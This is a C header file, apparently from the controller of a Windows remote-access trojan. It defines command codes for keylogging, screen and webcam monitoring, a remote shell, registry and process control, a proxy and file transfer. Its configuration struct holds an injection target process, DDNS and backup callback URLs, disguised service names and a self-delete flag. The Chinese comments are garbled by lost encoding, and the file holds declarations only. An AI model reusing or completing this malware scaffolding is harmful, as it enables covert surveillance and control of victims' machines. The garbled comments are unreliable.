/*
*	��������,��������
*/

#include "resource.h"

//��Ϣ����
#define WM_ADDCLIENT			WM_USER + 401		//���ӿͻ�
#define WM_MYITEMCHANGED		WM_USER + 402		//��Ŀ�仯
#define WM_CLIENTMAINRCLICK		WM_USER + 405		//�û��һ����
#define WM_RESIZE_WND			WM_USER + 408		//����������Ŀ
#define WM_LOGINSUCCESS			WM_USER + 424		//��¼���
#define WM_CLOSEITEM			WM_USER + 604		//�ͻ��ر�

//���״���
#define CLIENT_SYSTEM_RESTART	1020				//�����ͻ�����
#define CLIENT_SYSTEM_SHUTDOWN	1021				//�رտͻ�����
#define CLIENT_PRO_UNINSTALL	1022				//ж�ؿͻ�����
#define CLIENT_MODIFY_INFO		1023				//���Ŀͻ���Ϣ
#define CLIENT_LOGIN_SUCCESS	1024				//ǩ���ɹ�
#define CLIENT_FRAME_START		1028				//��ʼ��Ļ����
#define CLIENT_FILES_START		1029				//��ʼ��������
#define CLIENT_KEYMON_START		1032				//��ʼ���̼��
#define CLIENT_TLNT_START		1033				//��ʼ�����ն�
#define CLIENT_REGEDIT_START	1034				//��ʼע������
#define CLIENT_PROC_START		1035				//��ʼ���̹���
#define CLIENT_SERVICE_START	1036				//��ʼ�������
#define CLIENT_MULIT_START		1037				//��ʼ����Ƶ����
#define CLIENT_PROXY			1038				//��ʼ�������

#define CONN_MAIN				3000				//��������
#define CONN_FILE_UP			3004				//�ϴ��ļ�
#define CONN_FILE_DL			3005				//�����ļ�

#define CONN_FILE_MANA_SEND		4001				//�ļ������͹ܵ�
#define CONN_FILE_MANA_RECV		4002				//�ļ�������չܵ�
#define CONN_FILE_FRAM_SEND		4003				//��Ļ��ط��͹ܵ�
#define CONN_FILE_FRAM_RECV		4004				//��Ļ��ؽ��չܵ�
#define CONN_FILE_TLNT_SEND		4005				//�����ն˷��͹ܵ�
#define CONN_FILE_TLNT_RECV		4006				//�����ն˽��չܵ�
#define CONN_FILE_REGD_SEND		4007				//ע���༭���͹ܵ�
#define CONN_FILE_REGD_RECV		4008				//ע���༭���չܵ�
#define CONN_FILE_PROC_SEND		4009				//���̹����͹ܵ�
#define CONN_FILE_PROC_RECV		4010				//���̹�����չܵ�
#define CONN_FILE_SERV_SEND		4011				//��������͹ܵ�
#define CONN_FILE_SERV_RECV		4012				//���������չܵ�
#define CONN_FILE_KEYM_SEND		4013				//���̼�ط��͹ܵ�
#define CONN_FILE_KEYM_RECV		4014				//���̼�ؽ��չܵ�
#define CONN_FILE_MULT_SEND		4015				//��Ƶ��ط��͹ܵ�
#define CONN_FILE_MULT_RECV		4016				//��Ƶ��ؽ��չܵ�

typedef enum tagWin32SysType{
   Windows32s,
   WindowsNT3,
   Windows95,
   Windows98,
   WindowsME,
   WindowsNT4,
   Windows2000,
   WindowsXP,
   Windows2003
}Win32SysType;

typedef struct _MYLISTFILEINFO_
{
	HWND	hWnd;
	UINT	m_FileLen;
	UINT	m_FilePoint;
	BOOL	m_IsExec;
	char	m_LocalFile[256];
	char	m_RemoteFile[256];
}MYLISTFILEINFO,*LPMYLISTFILEINFO;

typedef struct _GOLBALVALUE_
{
	BOOL	m_IsMainExit;
	HWND	m_MainhWnd;
	char	m_UserName[256];
	char	m_UserPass[256];
	int		m_Response;
}GOLBALVALUE,*LPGOLBALVALUE;

typedef struct _CMDINFO_
{
	UINT m_Command;
	UINT m_DataLen;
}CMDINFO,*LPCMDINFO;

typedef struct _SOCKETINFO_
{
	SOCKET s;
	HANDLE thread;
}SOCKETINFO,*LPSOCKETINFO;

typedef struct _LOGINSUCCESS_
{
	UINT m_Socket;
	char m_Ip[20];
}LOGINSUCCESS,*LPLOGINSUCCESS;

typedef struct _LOGININFO_
{
	UINT m_CpuSpeed;			//CPU��Ƶ
	UINT m_MemContent;			//�ڴ�����
	char ID[17];				//Ψһ��ʶ
	char m_PcName[64];			//���������
	char m_SysType;				//����ϵͳ����
	char m_CpuCount;			//CPU����
	char m_UserName[38];		//�û�����
}LOGININFO,*LPLOGININFO;

typedef struct _CLIENTITEM_
{
	time_t		m_LoginTime;
	char		m_Title[256];
	SOCKET		m_WorkSocket;
	LOGININFO	m_SysInfo;
}CLIENTITEM,*LPCLIENTITEM;

typedef struct _INITDLLINFO_
{
	WORD m_ServerPort;
	UINT m_ProcessId;
	UINT m_DllFileLen;
	char m_ProcessName[128];  //��������
	char m_KeyName[24];    //�ؼ���
	char m_CtrlFile[128];   //����dll����
	char m_StartFile[128];
	char m_ServerAddr[128];
	char m_ParentFile[256];
	char m_EventName[32];
	char m_DdnsUrl[128];
	char m_BakUrl[128];
	char m_IsUpdate;
	char m_ext[511];

	char  m_nowExefile[256];
	char  m_serviceName[100];
	char  m_serviceDisplayname[100];
	char  m_serviceMark[100];
	bool  m_bDelete;
}INITDLLINFO,*LPINITDLLINFO;

UINT WINAPI MyMainThread(LPVOID lPvoid);
UINT WINAPI MyChildThread(LPVOID lPvoid);

int  AcceptClientMain(SOCKET s,LPCLIENTITEM pData);
BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
void TransParentDC(CRect rect,CDC * pDC);
BOOL ExecCmd(SOCKET s, UINT Command,int len);
void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);
BOOL GetValue(char * SrcStr,char * DesStr,char *Value);
BOOL MakeFilePath(char *pathName);
void GetMyFilePath(char* FileName);
void GetIniFileName(char* pFile);
bool CopySocket(HWND hWnd, SOCKET s, DWORD nInfo);
SOCKET StartTcp(WORD Port);

